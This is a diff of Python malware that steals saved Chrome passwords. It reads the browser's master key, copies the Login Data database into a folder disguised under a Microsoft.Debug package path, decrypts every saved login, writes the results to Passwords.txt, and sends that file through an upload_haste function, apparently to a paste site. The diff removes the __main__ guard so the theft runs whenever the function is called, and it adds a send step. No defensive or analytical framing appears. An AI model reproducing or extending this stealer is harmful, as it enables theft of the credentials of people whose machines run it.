@@ -2,7 +2,7 @@ import csv
 import os
 from base64 import b64decode
 from json import dumps, loads
-from os import environ, getenv, listdir, sep
+from os import environ, getenv, listdir, remove, sep
 from re import findall
 from shutil import copy2
 from sqlite3 import connect
@@ -92,6 +92,8 @@ def steal():
 
 
 def dump_chrome():
+    """Dumps chrome password"""
+        
     def get_master_key():
         with open(
             environ["USERPROFILE"]
@@ -124,47 +126,45 @@ def dump_chrome():
         except Exception:
             return "Chrome < 80"
 
-    if __name__ == "__main__":
-        main_path = f"{environ['USERPROFILE']}/AppData/Local/Packages/Microsoft.Debug_8wekyb3d8bbwe/SystemAppData"
-        master_key = get_master_key()
-        login_db = (
-            environ["USERPROFILE"]
-            + r"\AppData\Local\Google\Chrome\User Data\default\Login Data"
-        )
+    main_path = f"{environ['USERPROFILE']}/AppData/Local/Packages/Microsoft.Debug_8wekyb3d8bbwe/SystemAppData"
+    master_key = get_master_key()
+    login_db = (
+        environ["USERPROFILE"]
+        + r"\AppData\Local\Google\Chrome\User Data\default\Login Data"
+    )
 
-        copy2(login_db, f"{main_path}/Loginvault.db")
+    copy2(login_db, f"{main_path}/Loginvault.db")
 
-        conn = connect(f"{main_path}/Loginvault.db")
-        cursor = conn.cursor()
+    conn = connect(f"{main_path}/Loginvault.db")
+    cursor = conn.cursor()
+    
+    def send():
+        """Sends dumped info"""
+        with open(f"{main_path}/Passwords.txt", "r") as content:
+            print(content.read())
+            upload_haste(content.read())
 
-        try:
-            cursor.execute(
-                "SELECT action_url, username_value, password_value FROM logins"
-            )
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = decrypt_password(encrypted_password, master_key)
-                print(
-                    f"URL: {url} \nUser Name: {username} \nPassword: {decrypted_password}"
-                )
+    try:
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(encrypted_password, master_key)
 
-                rows = [
-                    [
-                        f"URL: {url} \nUsername: {username} \nPassword {decrypted_password}\n"
-                    ]
-                ]
+            rows = [
+                [f"URL: {url} \nUsername: {username} \nPassword {decrypted_password}\n"]
+            ]
 
-                with open(f"{main_path}/Passwords.txt", "a") as csvfile:
-                    csvwriter = csv.writer(csvfile)
-                    csvwriter.writerows(rows)
+            with open(f"{main_path}/Passwords.txt", "a") as csvfile:
+                csvwriter = csv.writer(csvfile)
+                csvwriter.writerows(rows)
+                
 
-            with open(f"{main_path}/Passwords.txt", "r") as content:
-                upload_haste(content)
 
-        except Exception:
-            pass
-
-        cursor.close()
-        conn.close()
+    except Exception:
+        pass
+    
+    send()
+    cursor.close()
+    conn.close()
